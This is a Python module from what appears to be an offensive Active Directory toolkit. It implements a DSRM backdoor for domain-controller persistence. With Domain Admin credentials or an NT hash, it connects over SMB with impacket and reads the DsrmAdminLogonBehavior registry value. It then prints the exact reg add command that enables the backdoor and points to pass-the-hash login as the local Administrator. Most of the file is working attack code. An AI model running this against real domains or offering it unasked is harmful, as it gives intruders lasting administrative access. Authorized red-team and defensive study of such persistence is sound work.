"""DSRM Backdoor  -  abuse Directory Services Restore Mode password for DC persistence."""


import sys
from typing import Any

from adxpl.core.credential import ADCredential


MANIFEST = {
    "capability_id": "adxpl.persistence.dsrm.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["registry_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.003"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)

    print(f"[*] DSRM Backdoor → {args.target} ({args.domain})")

    try:
        from impacket.dcerpc.v5 import transport, rrp
        from impacket.smbconnection import SMBConnection
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    if not cred.has_password and not cred.has_hash:
        print("[!] DSRM backdoor requires DA credentials", file=sys.stderr)
        return 1

    try:
        smb = SMBConnection(args.target, args.target, sess_port=445)
        if cred.has_password:
            smb.login(cred.username, cred.password, args.domain)
        else:
            smb.login(cred.username, "", args.domain, cred.lm_hash, cred.nt_hash)

        rpctransport = transport.SMBTransport(args.target, filename=r"\winreg", smb_connection=smb)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rrp.MSRPC_UUID_RRP)

        hKey = rrp.hOpenLocalMachine(dce)["phKey"]
        subkey = r"System\CurrentControlSet\Control\Lsa"

        try:
            hSubKey = rrp.hBaseRegOpenKey(dce, hKey, subkey)["phkResult"]
            current_val = rrp.hBaseRegQueryValue(dce, hSubKey, "DsrmAdminLogonBehavior")
            print(f"[*] Current DsrmAdminLogonBehavior: {current_val[1]}")
        except Exception:
            print("[*] DsrmAdminLogonBehavior not set (default: 0)")

        print("[*] To enable DSRM backdoor, set DsrmAdminLogonBehavior = 2:")
        print(f"    reg add 'HKLM\\{subkey}' /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f")
        print("[*] Then authenticate with the DSRM password via PtH to the local Administrator")
        print("[*] This module reads the current value. Set --force to write (not implemented yet).")

        dce.disconnect()
        smb.logoff()
        return 0

    except Exception as exc:
        print(f"[-] DSRM backdoor check failed: {exc}", file=sys.stderr)
        return 1
